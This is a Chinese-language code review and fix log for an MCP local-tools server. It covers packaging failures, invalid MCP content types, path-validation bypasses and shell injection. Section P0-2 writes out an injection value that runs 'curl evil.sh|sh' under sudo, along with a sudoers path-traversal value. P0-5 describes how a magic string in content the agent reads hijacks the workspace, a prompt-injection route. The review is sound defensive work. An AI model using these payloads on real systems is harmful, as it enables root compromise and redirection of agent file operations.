# 代码评审报告 — Ax-LocalTools-MCP v2.8.0

评审时间：2026-11-14
评审范围：`index.js`、`errors.js`、`responses.js`、`tools/*.js`、`lib/*.js`、`bin/`、`test/`、`package.json`、CI 配置
评审方式：静态通读 + 行为探针（直接调用 `handle()` 验证）+ `npm pack --dry-run` 校验发布产物 + 运行现有测试

> 说明：本报告主体记录的是**评审当时**发现的问题，原文保留作为历史证据。
> **状态更新：本报告列出的 6 个 P0 与主要 P1 均已在本次修复中处理；修复与真实运行验证过程中又发现并修掉 4 个评审漏网问题（含 1 个同类命令注入），详见文末「第 6 节 修复记录」。**
> 复述 `review.md` / `issue_tobe_fix.md` 中已在 v2.8.0 修掉的结构性问题（注册表化、`spawn` 数组传参、`ERR.*` 错误工厂等）不在此列。

---

## 0. 总体结论

架构方向是对的：工具注册表单点收敛、错误工厂、平台抽象层、测试报告机制都已到位，v2.8.0 的重构质量明显高于 `review.md` 描述的 MVP 状态。

但当前版本有 **6 个阻断级问题**，其中两个会让"发布包装不上"和"Linux 上被提权注入"，三个会让核心工具在默认配置下直接不可用。现有测试 100% 通过，却完全没有覆盖到这些路径——这是最值得警惕的地方：**测试通过率和可用性之间已经脱钩了**。

| 级别 | 数量 | 性质 |
|------|------|------|
| P0 阻断 | 6 | 安装失败、提权注入、协议不合规、开箱不可用、静默丢写入 |
| P1 高危/功能缺陷 | 10 | 数据正确性、资源泄漏、校验绕过、文档与实现不符 |
| P2 一致性/可维护性 | 12 | 抽象重复、死代码、错误码丢失、测试失真 |

---

## 1. P0 阻断级

### P0-1 发布包缺 `bin/`，`postinstall` 必然失败

`package.json:35-45` 的 `files` 白名单只列了 `index.js / errors.js / responses.js / tools/ / lib/ / README.md / package.json / mcp_config*.json / share4u*.md`，但 `package.json:13` 声明了：

```json
"postinstall": "node ./bin/setup-workspace.js"
```

实测：

```
$ npm pack --dry-run --json
打包文件数: 36
包含 bin/: false        ← setup-workspace.js 不在包里
```

后果：任何人 `npm i -g ax-local-operations-mcp` 都会在 postinstall 阶段 `MODULE_NOT_FOUND`，npm 以 `ELIFECYCLE` 判定安装失败。**从仓库直接 `npm start` 一切正常，所以本地开发永远发现不了这个问题**——这也是它一直没被发现的原因。

修复：

```json
"files": ["index.js", "errors.js", "responses.js", "tools/", "lib/", "bin/", ...]
```

更彻底的做法：`postinstall` 本身就不该做交互式配置（见 P2-10），install 阶段只允许"无副作用"操作。

---

### P0-2 `sudo_config` 存在 root 级命令注入（Linux）

`tools/sudoConfig.js:34` 的 `config_name` 直接来自调用方，一路拼进 shell 字符串：

```js
// lib/sudoersConfigManager.js:250
const configPath = path.join(this.sudoConfig.configDir, fileName);
// :268 / :279-281 / :313 / :317
await execAsync(`sudo cp ${configPath} ${backupPath}`);
await execAsync(`sudo cp ${tempFile} ${configPath}`);
await execAsync(`sudo chmod 440 ${configPath}`);
await execAsync(`sudo rm ${configPath}`);
```

两条独立攻击面：

1. **shell 注入**：`config_name: "a; curl evil.sh|sh #"` → `sudo rm /etc/sudoers.d/a; curl evil.sh|sh #`
2. **路径穿越**：`config_name: "../../etc/sudoers"` → `path.join` 归一化后覆盖任意 root 可写文件

此外 `username` 未做任何校验就拼进规则文本（`lib/sudoersConfigManager.js:85,133`），换行符即可注入任意 `NOPASSWD: ALL` 规则。顺带一提，`:136` 的 `${username} ALL=(ALL) !NOPASSWD: /bin/rm -rf /` 不是合法 sudoers 语义——`!NOPASSWD:` 不存在，这行"防护"实际不生效。

修复要点：
- `fileName` / `username` 双重校验：`/^[A-Za-z0-9_-]{1,32}$/` 且 `path.basename(fileName) === fileName`
- 所有 `execAsync` 改 `execFile('sudo', ['rm', configPath])`，不留 shell
- 写入 sudoers 前必须 `visudo -c -f` 通过（现在 `installSudoersConfig` 里**没有**这一步，只在 `validateSudoersConfig` 里做，但 `install` 调用的是 `generate → install`，中间没有校验）

---

### P0-3 返回了非法的 MCP content type `json`

MCP 规范的 `ContentBlock` 只有 `text / image / audio / resource_link / resource`。`type: 'json'` 不在其中，全仓库出现 12 处：

`lib/output.js:8,12`、`responses.js:2`、`fileCompare.js:39`、`fileSearch.js:64,68,79,83`、`environmentMemoryAdapter.js`（16 处）、`filePermissions.js:72,77`、`sudoConfig.js:79,84`、`timeTool.js:24,28`、`fileWatch.js:294`

```js
// lib/output.js:7-8
case 'json':
  return { content: [ { type: 'json', json: jsonObj } ] };  // ← 非法
```

实际后果分两种，都不好：
- 严格校验的客户端（用 zod 解析 `CallToolResultSchema`）直接报错，整个工具调用失败
- 宽松的客户端只挑 `type === 'text'` 的块，JSON 内容被**静默丢弃**，调用方看不到任何数据

同时 `registry.js` 给 6 个工具声明了 `outputSchema`（`:126-262`），但结果里从来没有 `structuredContent`。规范要求声明了 `outputSchema` 就应返回匹配的 `structuredContent`，现在声明和实现是脱节的。

修复：

```js
case 'json':
  return { content: [ { type: 'text', text: JSON.stringify(jsonObj, null, 2) } ] };
// 或者（推荐，配合 outputSchema）
return { content: [{ type: 'text', text: JSON.stringify(jsonObj) }], structuredContent: jsonObj };
```

`both` 分支两个块都是 `type:'text'` 即可，不必区分。

---

### P0-4 默认工作区位于隐藏目录 → 开箱即用全部失败

三个地方串起来构成一个死结：

1. `index.js:128-131` — 每次工具调用都自动注入 `working_directory = getCurrentWorkspace()`
2. `tools/workspaceManager.js:46-50` — 兜底值是 `~/.axlocalop/workspace`
3. `tools/securityValidator.js:15-20,36` — **任何路径包含以 `.` 开头的目录组件即拒绝**

而 `environmentMemory.js:36` 的默认值同样是 `~/.axlocalop/workspace`。于是未配置过工作区的用户，第一次调用就是：

```
$ node probe.js
2) 默认工作区相对路径: 拒绝 -> E_PATH_DENIED C:\Users\Anders\.axlocalop\workspace
```

所有相对路径调用（`read note.md`、`list .`）100% 失败，且错误信息只说"路径不允许"，用户完全无法定位原因——因为问题出在用户从未指定过的默认值上。

这是"默认值自己把自己挡掉了"。修复二选一：
- 默认目录改为非隐藏：`~/axlocalop/workspace`
- 或在 `_resolve` 中，对显式传入的 `workingDirectory` **自身**豁免隐藏目录检查（只检查 `workingDirectory` 之下的相对路径部分）

---

### P0-5 魔法字符串劫持：任意参数含"当前工作目录是："就吞掉整个工具调用

`index.js:86-124` 递归扫描 args 里所有字符串，命中就把调用短路掉：

```js
// tools/workspaceManager.js:27-30
parseWorkspaceCommand(userInput) {
  const match = userInput.match(/当前工作目录是：(.*)/);
  return match ? match[1].trim() : null;
}
```

实测：

```
4) parse("请把 当前工作目录是：/etc 写进文件") = "/etc 写进文件"
```

三个问题叠在一起：

1. **正常写入会被静默吞掉**。调用 `file_operation{operation:'write', content:'...当前工作目录是：...'}` → 文件不会写，返回"已设置临时工作目录"，**没有写入失败，也没有任何提示**
2. **提示注入面**。任何被读取的外部内容只要含有该串，就能改写服务端工作区，后续所有相对路径操作被重定向到攻击者指定目录
3. **文档写的和实现对不上**。`README.md:41,80`、`WORKSPACE_MANAGEMENT.md:16`、`localtool-guide-forAgent.md:82` 都写 `当前的工作目录是：`（多一个"的"），而正则要求 `当前工作目录是：`。也就是说：**文档承诺的功能不生效，只留下了劫持风险**

修复：删掉这套隐式拦截。工作区切换已经有 `workspace_manager` 工具，显式调用即可，行为和返回值都清晰。

---

### P0-6 `file_compare` / `file_hash` 校验的是解析后路径，操作的是原始相对路径

```js
// tools/fileCompare.js:24,30-31
if (!this.securityValidator.isPathAllowed(left, workDir)) throw ...   // 按 workDir 解析并校验（通过）
const [content1, content2] = await Promise.all([
  fs.readFile(left, 'utf8'),        // ← 用原始相对路径，按 process.cwd() 解析
  fs.readFile(right, 'utf8')
]);
```

`fileHash.js:26,37-38` 同样问题。

实测（文件实际存在于工作目录，校验也通过了）：

```
3) file_compare 相对路径失败 -> 文件不存在: D:\projects\Ax-LocalTools-MCP\a.txt
```

失败信息里的路径是 `process.cwd()`，不是传入的 `working_directory`。这有两层危害：功能上相对路径不可用；安全上"校验对象"和"实际操作对象"不是同一个字符串，正是路径绕过漏洞的经典形态（今天是 ENOENT 报错，哪天 cwd 里恰好存在同名文件，就成了越权读取）。

修复：`const a = sv.resolveAndAssert(left, workDir)`，后面全用 `a`。

---

## 2. P1 高危 / 功能缺陷

### P1-1 `file_edit` 描述宣称"操作前自动备份"，代码里没有备份

`registry.js:301` 写"操作前自动备份原文件"，`fileEdit.js` 全文没有任何 backup 逻辑。实测：

```
6) 备份文件: 无（描述声称"操作前自动备份"）
```

Agent 会基于这个描述判断"改错了能回滚"。要么实现备份，要么改描述——后者更省事，但前者对这个工具的价值更大。

### P1-2 `append_lines` 会多插一个空行

文件以换行结尾时 `split(/\r?\n/)` 末位多一个空串，`push` 之后就变成中间空行：

```
5) 'l1\nl2\n' + append 'l3'  =>  "l1\nl2\n\nl3"
```

同一原因让所有 `line` 类操作的行号与编辑器显示差 1。修复：写回前若原文件以 EOL 结尾，先 `pop()` 掉尾空串，拼接后再补回。

### P1-3 `file_permissions` 忽略 `working_directory`

`filePermissions.js:38` 调用 `isPathAllowed(target)` 时没传工作目录，而其他工具都传了。相对路径会按 home 解析，与 `index.js` 注入的 `working_directory` 不一致。

### P1-4 工作区设置失败仍返回成功

`workspaceManager.js:86,91` 丢弃了 `setTempWorkspace/setDefaultWorkspace` 的布尔返回值：

```js
this.setTempWorkspace(workspace_path);        // 返回 false 也不管
return respond(fmt, `成功设置临时工作目录: ${workspace_path}`, { status: 'ok', ... });
```

只有 `index.js:104` 那条劫持路径检查了返回值。另外 `validateWorkspace`（`:38`）在校验阶段就 `mkdirSync`，一个"校验"函数带写副作用，语义上很危险。

### P1-5 `file_watch` 会永久挂起，还会擅自创建被监视目录

- `fileWatch.js:349` — `duration === 0` 时直接 `return`，Promise 永不 settle，MCP 调用永久挂起（`AGENTS.md` 已记录，但没有任何超时兜底或提示）
- `fileWatch.js:324-328` — 路径不存在时 `mkdir` 创建它。一个标记为 `readOnlyHint: true` 的工具产生写副作用
- `duration > 0` 时工具调用全程阻塞，客户端容易先超时，形成"工具还在跑、调用方已放弃"的僵尸 watcher

### P1-6 命令超时只杀一层进程

`commandExecution.js:48`：

```js
setTimeout(() => { killed = true; child.kill(); }, timeout_ms)
```

`child` 是 `pwsh -Command "..."`。在 Windows 上 `kill()` 只终止 pwsh，它拉起的 `node` / `npm` / 编译进程继续存活；POSIX 下同理（需要 `detached: true` + 负 PID 杀进程组）。超时语义因此是"看起来超时了，实际还在后台跑"。

另外 `:115-118` 的 `warn + confirm` 分支是死代码——`commandPolicy.evaluate` 只返回 `allow` / `deny`，WARN 层是空的。`evaluate(command, { allowSudo: true })` 的第二个参数函数签名也不接收。

### P1-7 解压无 zip-slip 防护

`fileArchive.js:107-131` 直接把 `unzip -d` / `tar -C` 指向目标目录，不校验归档内条目名。`../../` 型条目可写到目标目录之外。对一个"能读任意本地文件"的 Agent 工具，这条链路相当于"下载压缩包 → 解压 → 越界写入"。

### P1-8 符号链接可逃出工作目录

`securityValidator._resolve`（`:33-45`）只做 `path.resolve` 字符串前缀比较，不做 `fs.realpath`。工作目录内一个指向外部的 symlink，可以绕过所有路径校验。修复：对已存在的路径取 `realpath` 后再比较（对不存在的路径比较其最近存在祖先的 realpath）。

### P1-9 `task_manager` 描述符 enum 与实现不一致

`registry.js:443` 的 enum 是 `['create','list','update','complete','clear']`，但 `taskManager.js:37-44` 实现了 `delete` / `get`。严格校验 enum 的客户端会静默拒绝这两个操作。另外 `listTasks`（`:162`）直接取 `task.subtasks.length`，遇到缺该字段的旧数据文件会抛异常。

### P1-10 版本号三处硬编码且与 `package.json` 不一致

`index.js:20,33,59` 全部写死 `2.7.0`，`package.json` 是 `2.8.0`。`--version` 输出与实际版本不符，MCP 握手里的 serverInfo 也是错的。修复：`const { version } = require('./package.json')`。

---

## 3. P2 一致性与可维护性

| # | 问题 | 位置 | 说明 |
|---|------|------|------|
| 1 | 四套返回封装并存 | `lib/output.js`、`responses.js`、`workspaceManager.js:13`、`commandExecution.js:58/81` | 同一个 `{content:[...]}` 被独立实现了 4 次，改协议要改 4 处 |
| 2 | 三种路径校验姿势 | `resolveAndAssert` / `isPathAllowed(x, wd)` / `isPathAllowed(x)` | 第三种（`filePermissions`）已经漏传 wd 了，抽象不收敛就一定会继续漏 |
| 3 | 错误码大量丢失 | 多数工具 `throw new Error('中文...')` | `index.js:139-149` 只回 `error.message`，`E_*` 码全部丢失，Agent 无法按类型分支处理。`ERR.*` 工厂建立了却只有一半工具在用 |
| 4 | 死代码 | `pathUtils.assertInHome/validatePathSafety/getPathInfo`、`securityValidator.isDangerousCommand`、`commandPolicy.identifyCommandType/checkSudoConfig/SUDOERS_TEMPLATES`、`platformUtils` 的 4 个方法 | `AGENTS.md` 已标注 `isDangerousCommand` 是 legacy shim，但仓里已无人调用，可直接删 |
| 5 | **测试在测死代码** | `test/crossPlatformTestSuite.js:15,228` | 断言 `assertInHome` 拒绝家目录外路径，但生产环境用的是 `SecurityValidator`（**允许任意绝对路径，无 home 限制**）。测试验证的是一套已经不存在的安全模型 → 100% 通过是假象 |
| 6 | `getShellConfig` 与实际不符 | `platformUtils.js:75-93` | 返回 `cmd.exe`，实际命令执行走 `pwsh`。要么删，要么让 `commandExecution` 真用它 |
| 7 | 环境变量每次同步读盘 | `environmentMemory.js:100-102` | `getCurrentWorkspace()` 每次工具调用都触发一次同步 `readFileSync`，且在 `index.js` 热路径上 |
| 8 | `.env` 里装的是 JSON | `environmentMemory.js:12-13` | 文件名误导（不是 dotenv 格式），且与"环境变量"语义无关，本质是配置文件 |
| 9 | 写文件不建父目录 | `fileOperation.js:152` | `write` 到不存在的子目录直接 ENOENT，报错信息对 Agent 不友好 |
| 10 | `postinstall` 交互式提示 | `bin/setup-workspace.js:17,146` | `npm i` 卡住等待输入；CI 里 `npm ci` 也会触发。加上 P0-1，这个脚本目前既不安全也不可用 |
| 11 | `max_size` 可被调用方放大 | `fileOperation.js:36,69,109` | 默认 10MB 上限是调用方可覆盖的参数，`max_size: 1e12` 就会全量读入内存（先 `readFile` 再截断到 2MB） |
| 12 | `file_compare` 不是真 diff | `fileCompare.js:59-101` | 逐行位置比较，插入一行会让其后所有行都标成 `modified`；`added/removed` 仅在对方为空行时成立 |

补充两点搜索相关的：
- `fileSearch.js:95` 用 `new RegExp(pattern, 'i')`，无灾难回溯保护，一个 `(a+)+$` 就能锁死进程；`:41` 的 timer 只在**文件之间**生效，单个大文件里跑不完照样卡住
- 默认 `ignore: []`，也就是说 `search_path: "."` 会扫进 `node_modules` 和 `.git`（`fileWatch` 内置了这些默认忽略，`fileSearch` 没有，策略不统一）

---

## 4. 建议修复顺序

**第一批（发布前必须，半天内可完成）**
1. P0-1 `files` 补 `bin/`（一行）
2. P0-3 `type:'json'` 全部改 `text`（`lib/output.js` + `responses.js` 两处改完，剩下都是调用方）
3. P0-6 `fileCompare` / `fileHash` 改用 `resolveAndAssert` 的返回值（4 行）
4. P0-4 默认工作区改非隐藏目录（1 行 + 迁移旧配置）
5. P1-10 版本号读 `package.json`

**第二批（安全，需要一轮 review）**

6. P0-2 sudoers 参数校验 + `execFile` 化（改动集中在 `sudoersConfigManager.js`）
7. P0-5 删除 `index.js` 的隐式拦截，文档同步
8. P1-8 symlink realpath、P1-7 zip-slip 条目校验

**第三批（清理）**

9. P1-1/2/3/4 正确性修复 + 描述对齐
10. P2-1/2/3 抽象收敛：一个 `respond()`、一个 `resolveTarget()`、错误码透传到 `index.js`

**测试侧最关键的一件事**：现有 21 个集成用例全是"注册成功吗"级别的断言。P0-4/P0-5/P0-6 三个阻断问题，只要有一个"调用 `file_operation` 写文件 → 断言文件内容正确"的端到端用例就能立刻暴露。建议优先补 3 个行为用例，而不是继续扩充注册检查。

---

## 5. 值得肯定的部分

- `tools/registry.js` 单点注册 + `createDescriptor` 工厂，新增工具成本低，`annotations` / `outputSchema` 也按规范声明了
- `lib/commandPolicy.js` 用正则表分层，比原来的 `includes('sudo')` 靠谱得多
- `fileArchive` 已经用 `spawn(cmd, argsArray)`，P0-2 那类问题在主链路上是解决了的——只是 sudo 分支漏了
- `errors.js` 的 `ToolError` 带 `code` + `meta`，设计是对的，只是没被全量使用
- 测试报告按平台分文件、生成 JSON+HTML，工程化意识到位
- `AGENTS.md` / `CLAUDE.md` 把非显而易见的坑（动态 ESM import、拦截器、pwsh 缓存）都写下来了，接力成本很低

---

## 6. 修复记录（2026-11-14，同日完成）

按「先补行为用例 → 再逐层修 → 最后做真实 stdio 验证」的顺序执行。

### 6.1 测试先行

抽出 `lib/dispatcher.js`，让测试与 `index.js` 的 stdio 处理器共用同一条调用路径（此前 `index.js` 的拦截逻辑无法独立测试）。新增：

| 文件 | 作用 |
|------|------|
| `test/e2eTest.js` | 行为断言：写入→读回、路径解析、输出合规、发布产物、postinstall |
| `test/stdioTest.js` | 官方 SDK `Client` + `StdioClientTransport` 真实握手、`tools/list`、全工具 `tools/call` |
| `test/test-workspace.js` | 重写：修掉「同步 runner 跑 async 用例」造成的假绿 |

初始 e2e 结果为 **9 项红灯**，与报告中的 P0/P1 一一对应；修复过程中又追加了 3 条针对权限层命令注入的回归用例（先跑出 3 项红灯），最终 **28/28 通过**。

### 6.2 逐项状态

| 编号 | 状态 | 修复要点 |
|------|------|----------|
| P0-1 | ✅ | `files` 补 `bin/`；另发现 `postinstall` 是交互式脚本，无 TTY 时 `process.exit(1)`，已重写为非交互、幂等、永不失败；`--interactive` 保留为显式命令 |
| P0-2 | ✅ | `sudoersConfigManager.js` 全部 `exec` 改为 `execFile` + 参数数组；新增 `config_name` / `username` / `commands` 白名单校验（纯函数导出，非 Linux 也可测）；`resolveConfigPath` 防目录穿越；`testSudoConfig` 固定探针 |
| P0-3 | ✅ | `lib/output.js` / `responses.js` 统一收口，18 处非法 `type:'json'` 全清；JSON 以 text 承载，结构化数据放 `structuredContent` |
| P0-4 | ✅ | 默认工作区改为 `~/axlocalop/workspace`（非隐藏），旧配置自动迁移 |
| P0-5 | ✅ | 删除 `parseWorkspaceCommand` 拦截器；README / WORKSPACE_MANAGEMENT / agent 指南同步 |
| P0-6 | ✅ | `file_compare` / `file_hash` 改用 `resolveAndAssert` 返回值；**本轮又发现并修复同类问题**：`file_permissions`、`file_watch`（后者会在 `process.cwd()` 凭空建目录） |
| P1-1/2/4/9/10 | ✅ | 自动备份、追加空行、失败不报成功、enum 对齐、`--version` 读 `package.json` |
| P1-3 | ✅ | `file_permissions` 支持 `working_directory` 并用解析后路径执行 |
| P2 输出合规 | ✅ | 发现 `execute_command` / `task_manager` 声明了 `outputSchema` 却缺 `structuredContent`，真实 SDK 客户端报 **-32600**；工具层补真实数据，`dispatcher` 加兜底 |
| **追加（评审漏网）** | ✅ | `lib/crossPlatformPermissions.js` 的 `WindowsPermissionAdapter` 有 7 处把 `filePath` / ACL 用户名拼进 `icacls "..."`、`attrib "..."` 的 shell 字符串，引号可被闭合；`setAclPermissions` 的 catch 还会把注入失败**静默吞成成功** |

### 6.3 真实运行验证中发现的新问题

只有走完整 stdio 链路才暴露出来的三个问题（e2e 直接调函数测不到）：

1. **outputSchema 强制结构化输出**：SDK 要求声明了 `outputSchema` 的工具成功时**必须**返回 `structuredContent`，并用 Ajv 校验。已修复。
2. **绝对路径被默认工作区误拒**：`dispatcher` 给每次调用注入 `working_directory`，而 `SecurityValidator` 把它当成所有路径的沙箱边界，导致显式绝对路径一律 `E_PATH_DENIED`。已按代码注释的设计意图修正：**工作目录是相对路径的解析基准与作用域，不是绝对路径的沙箱**；相对路径穿越仍被拒绝，隐藏目录规则仍生效，并补充 `~` 展开。
   > 设计影响：调用方显式传 `working_directory` 时，绝对路径不再受该目录圈定。这是「Agent 全控授权」定位下的取舍，已在 README 写明；若需要强沙箱，应另加显式的 `allowed_roots` 配置。
3. **Windows 上 `file_archive` 完全不可用**：`C:\...` 被 bsdtar 当成 `host:path` 远程语法。改为向外部命令传相对 `cwd` 的路径，压缩→解压往返已验证内容一致。
4. **权限层仍有同类命令注入（最后一轮静态扫描发现）**：修完 sudoers 后复查 `execAsync` 残留，发现 `lib/crossPlatformPermissions.js` 还有 7 处 shell 拼接，且 `lib/commandPolicy.js` 有 2 处固定字符串的 `exec`。已全部改为 `execFile` + 参数数组；ACL 的 `user:permission` 新增导出纯函数 `assertSafeAclSpec` 做白名单，校验错误不再被 catch 吞掉，会冒泡为 `E_INVALID_ARGS`。

> 这类问题的教训：`sudoersConfigManager` 因为「有 `${}` 插值」被识别成注入点，而权限适配器用的是双引号包裹，**看起来像已防护**，实际 `"` 可以闭合。修复注入不能只按文件筛选，必须全局清零 `exec()`。

### 6.4 最终验证结果

```
npm test
  e2eTest.js        28/28
  test-workspace.js  7/7
  integrationTest   21/21 (100%)
  stdioTest.js      initialize / tools/list(13) / tools/call(12+) / 压缩解压往返 全通过
node test/runTests.js  21/21
npm install            postinstall 静默成功（此前会 ELIFECYCLE）
npm pack --dry-run     39 个文件，含 bin/setup-workspace.js / lib/dispatcher.js
静态残留检查          type:'json' 0 处；execAsync() 0 处；exec 模板串插值 0 处
版本一致性            package.json / package-lock.json 均为 2.8.0
```

权限层功能也做了实测（不是只看测试绿灯）：`execFile` 下 `icacls` 读到 4 条 ACL、`attrib` 读到属性位，`+R/-R` 使文件 mode 从 `100666 → 100444 → 100666` 真实往返；正常 `Everyone:F` 授权成功，含引号/换行/额外规则的参数被明确拒绝。

### 6.5 仍未处理（建议下一轮）

- **P1-6** 命令超时只杀一层进程（子进程可能残留）
- **P1-7 / P1-8** 解压无 zip-slip 条目校验；符号链接逃逸的完整回归用例
- **P1-11** `max_size` 由调用方任意放大，大文件先全量读入内存
- **P1-12** `file_compare` 是逐行位置比较，不是真 diff
- **P2** `file_search` 的 `new RegExp(pattern)` 无灾难回溯保护；`pathUtils.js` 中 `assertInHome` 等死代码（仍被旧测试覆盖，制造绿灯假象）可清理
- 建议把 `test/crossPlatformTestSuite.js` 中针对废弃家目录模型的断言迁移到 `SecurityValidator` 当前模型上
